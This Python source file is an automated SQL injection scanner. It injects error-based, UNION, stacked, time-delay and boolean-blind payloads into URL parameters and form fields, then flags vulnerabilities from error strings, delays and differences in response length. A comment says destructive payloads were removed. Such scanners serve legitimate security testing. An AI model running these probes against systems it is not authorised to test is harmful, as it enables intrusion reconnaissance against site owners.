import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3

urllib3.disable_warnings()

PAYLOADS = {
    "error_based": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "'; SELECT 1/0--",
        "1' AND extractvalue(1,concat(0x7e,version()))--"
    ],
    "union_based": [
        "' UNION SELECT null--",
        "' UNION SELECT null,null--",
        "' UNION SELECT null,null,null--",
        "' UNION ALL SELECT 'SQLi','test',null--"
    ],
    # Stacked-query probes are intentionally NON-DESTRUCTIVE. We only need to
    # provoke a SQL error to confirm injection; we must never risk damaging the
    # target. (Removed the previous DROP TABLE / INSERT / xp_cmdshell payloads,
    # which could destroy data or run commands on a genuinely vulnerable host
    # and added no detection value.)
    "stacked": [
        "'; SELECT 1--",
        "1; SELECT 1--"
    ]
}

SQL_ERRORS = {
    "MySQL":      ["you have an error in your sql syntax", "mysql_fetch", 
                   "mysql_num_rows", "supplied argument is not a valid mysql",
                   "valid mysql result", "mysqlclient", "mariadb"],
    "PostgreSQL": ["postgresql query failed", "pg_query", "pg_exec",
                   "unterminated quoted string", "pg::syntaxerror"],
    "MSSQL":      ["unclosed quotation mark", "microsoft ole db provider",
                   "odbc sql server driver", "sqlserver", "[microsoft][odbc"],
    "Oracle":     ["ora-", "oracle error", "oracle.*driver", "warning.*oci_"],
    "SQLite":     ["sqlite3::sqliteexception", "sqlite_error", 
                   "sqliteexception", "sqlite3.operationalerror"],
    "Generic":    ["sql syntax", "syntax error", "sql error", 
                   "database error", "query failed", "sql command"]
}

BLIND_PAYLOADS = {
    "MySQL":      "1' AND SLEEP(6)-- -",
    "PostgreSQL": "1'; SELECT pg_sleep(6)-- -",
    "MSSQL":      "1'; WAITFOR DELAY '0:0:6'-- -",
    "SQLite":     "1' AND randomblob(1000000000)-- -" # High blob to simulate latency
}

BOOLEAN_PAIRS = [
    ("1' AND '1'='1", "1' AND '1'='2"),   # true vs false condition
    ("1' AND 1=1--",  "1' AND 1=2--"),
    ("1 AND 1=1",     "1 AND 1=2")
]

def check_error_based(res_text, res_status):
    text_lower = res_text.lower()
    for db_type, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if pattern.lower() in text_lower:
                return True, db_type, f"{db_type} error pattern: '{pattern}'"
                
    # 500 Check with SQL hints
    if res_status == 500:
        sqli_hints = ["sql", "query", "syntax", "database", "db error"]
        if any(hint in text_lower for hint in sqli_hints):
            return True, "Unknown", "HTTP 500 with SQL-related content in body"
            
    return False, None, None

def test_url_params(url, blind=True, boolean_blind=True, timeout=8):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        return []
    
    findings = []
    vulnerable_params = set()
    
    active_payloads = []
    for cat in PAYLOADS.values():
        active_payloads.extend(cat)
        
    for param_name in params:
        if param_name in vulnerable_params:
            continue
            
        param_vulnerable = False
        
        # 1. Error / Union / Stacked testing
        for payload in active_payloads:
            if param_vulnerable:
                break
                
            test_params = dict(params)
            test_params[param_name] = [payload]
            test_url = parsed._replace(query=urlencode(test_params, doseq=True))
            
            try:
                res = requests.get(urlunparse(test_url), timeout=timeout, verify=False)
                is_vuln, db_type, evidence = check_error_based(res.text, res.status_code)
                
                if is_vuln:
                    param_vulnerable = True
                    vulnerable_params.add(param_name)
                    findings.append({
                        "url": url,
                        "parameter": param_name,
                        "payload": payload,
                        "vulnerable": True,
                        "type": "Error-Based",
                        "db_type": db_type,
                        "evidence": evidence,
                        "method": "GET",
                        "status_code": res.status_code,
                        "response_length": len(res.text),
                        "severity": "HIGH"
                    })
            except Exception:
                pass
                
        # 2. Time-Based Blind
        if not param_vulnerable and blind:
            for db_type, blind_payload in BLIND_PAYLOADS.items():
                if param_vulnerable:
                    break
                    
                test_params = dict(params)
                test_params[param_name] = [blind_payload]
                test_url = parsed._replace(query=urlencode(test_params, doseq=True))
                
                try:
                    start = time.time()
                    res = requests.get(urlunparse(test_url), timeout=timeout + 2, verify=False)
                    elapsed = time.time() - start
                    
                    if elapsed >= 5.5: 
                        param_vulnerable = True
                        vulnerable_params.add(param_name)
                        findings.append({
                            "url": url,
                            "parameter": param_name,
                            "payload": blind_payload,
                            "vulnerable": True,
                            "type": "Blind Time-Based",
                            "db_type": db_type,
                            "evidence": f"Response delayed {elapsed:.2f}s",
                            "method": "GET",
                            "status_code": res.status_code,
                            "response_length": len(res.text),
                            "severity": "HIGH"
                        })
                except Exception:
                    pass
                    
        # 3. Boolean Blind
        if not param_vulnerable and boolean_blind:
            for true_payload, false_payload in BOOLEAN_PAIRS:
                if param_vulnerable:
                    break
                    
                test_params_true = dict(params)
                test_params_true[param_name] = [true_payload]
                url_true = parsed._replace(query=urlencode(test_params_true, doseq=True))
                
                test_params_false = dict(params)
                test_params_false[param_name] = [false_payload]
                url_false = parsed._replace(query=urlencode(test_params_false, doseq=True))
                
                try:
                    res_true = requests.get(urlunparse(url_true), timeout=timeout, verify=False)
                    res_false = requests.get(urlunparse(url_false), timeout=timeout, verify=False)
                    
                    len_diff = abs(len(res_true.text) - len(res_false.text))
                    if len_diff > 50:
                        param_vulnerable = True
                        vulnerable_params.add(param_name)
                        findings.append({
                            "url": url,
                            "parameter": param_name,
                            "payload": f"True: {true_payload} | False: {false_payload}",
                            "vulnerable": True,
                            "type": "Blind Boolean-Based",
                            "db_type": "Unknown",
                            "evidence": f"Content length differs by {len_diff} chars",
                            "method": "GET",
                            "status_code": res_true.status_code,
                            "response_length": len(res_true.text),
                            "severity": "HIGH"
                        })
                except Exception:
                    pass
                    
    return findings


def run_sqli_scan(forms, url=None, blind=True, boolean_blind=True, timeout=8, test_all_params=True):
    results = []
    
    # 1. Test URL Parameters directly if an initial URL was provided
    if url:
        results.extend(test_url_params(url, blind, boolean_blind, timeout))
    
    active_payloads = []
    for cat in PAYLOADS.values():
        active_payloads.extend(cat)
        
    # 2. Test Forms
    for form in forms:
        action = form.get("action_url")
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])
        
        if not action or not inputs:
            continue
            
        vulnerable_params = set()
        
        for inp in inputs:
            if inp["type"] not in ["text", "search", "password", "hidden", "email", "number"]:
                continue
                
            if inp["name"] in vulnerable_params:
                continue
                
            param_vulnerable = False
            
            # --- PHASE A: Error-based testing ---
            for payload in active_payloads:
                if param_vulnerable:
                    break
                    
                data = {}
                for other in inputs:
                    if other.get("name"):
                        data[other["name"]] = payload if other["name"] == inp["name"] else "test"
                        
                try:
                    if method == "post":
                        res = requests.post(action, data=data, timeout=timeout, verify=False)
                    else:
                        res = requests.get(action, params=data, timeout=timeout, verify=False)
                        
                    is_vuln, db_type, evidence = check_error_based(res.text, res.status_code)
                    
                    if is_vuln:
                        param_vulnerable = True
                        vulnerable_params.add(inp["name"])
                        results.append({
                            "url": action,
                            "parameter": inp["name"],
                            "payload": payload,
                            "vulnerable": True,
                            "type": "Error-Based",
                            "db_type": db_type or "Unknown",
                            "evidence": evidence,
                            "method": method.upper(),
                            "status_code": res.status_code,
                            "response_length": len(res.text),
                            "severity": "HIGH"
                        })
                except Exception:
                    pass
                    
            # --- PHASE B: Time-Based Blind testing ---
            if not param_vulnerable and blind:
                for db_type, blind_payload in BLIND_PAYLOADS.items():
                    if param_vulnerable:
                        break
                        
                    data = {}
                    for other in inputs:
                        if other.get("name"):
                            data[other["name"]] = blind_payload if other["name"] == inp["name"] else "test"
                            
                    try:
                        start = time.time()
                        if method == "post":
                            res = requests.post(action, data=data, timeout=timeout + 2, verify=False)
                        else:
                            res = requests.get(action, params=data, timeout=timeout + 2, verify=False)
                        elapsed = time.time() - start
                        
                        if elapsed >= 5.5: 
                            param_vulnerable = True
                            vulnerable_params.add(inp["name"])
                            results.append({
                                "url": action,
                                "parameter": inp["name"],
                                "payload": blind_payload,
                                "vulnerable": True,
                                "type": "Blind Time-Based",
                                "db_type": db_type,
                                "evidence": f"Response delayed {elapsed:.2f}s",
                                "method": method.upper(),
                                "status_code": res.status_code,
                                "response_length": len(res.text),
                                "severity": "HIGH"
                            })
                    except Exception:
                        pass
                        
            # --- PHASE C: Boolean-Based Blind testing ---
            if not param_vulnerable and boolean_blind:
                for true_payload, false_payload in BOOLEAN_PAIRS:
                    if param_vulnerable:
                        break
                        
                    data_true = {}
                    data_false = {}
                    for other in inputs:
                        if other.get("name"):
                            data_true[other["name"]] = true_payload if other["name"] == inp["name"] else "test"
                            data_false[other["name"]] = false_payload if other["name"] == inp["name"] else "test"
                            
                    try:
                        if method == "post":
                            res_true = requests.post(action, data=data_true, timeout=timeout, verify=False)
                            res_false = requests.post(action, data=data_false, timeout=timeout, verify=False)
                        else:
                            res_true = requests.get(action, params=data_true, timeout=timeout, verify=False)
                            res_false = requests.get(action, params=data_false, timeout=timeout, verify=False)
                            
                        len_diff = abs(len(res_true.text) - len(res_false.text))
                        if len_diff > 50:
                            param_vulnerable = True
                            vulnerable_params.add(inp["name"])
                            results.append({
                                "url": action,
                                "parameter": inp["name"],
                                "payload": f"True: {true_payload} | False: {false_payload}",
                                "vulnerable": True,
                                "type": "Blind Boolean-Based",
                                "db_type": "Unknown",
                                "evidence": f"Content length differs by {len_diff} chars",
                                "method": method.upper(),
                                "status_code": res_true.status_code,
                                "response_length": len(res_true.text),
                                "severity": "HIGH"
                            })
                    except Exception:
                        pass
                        
            if not test_all_params and param_vulnerable:
                break
                
    return results
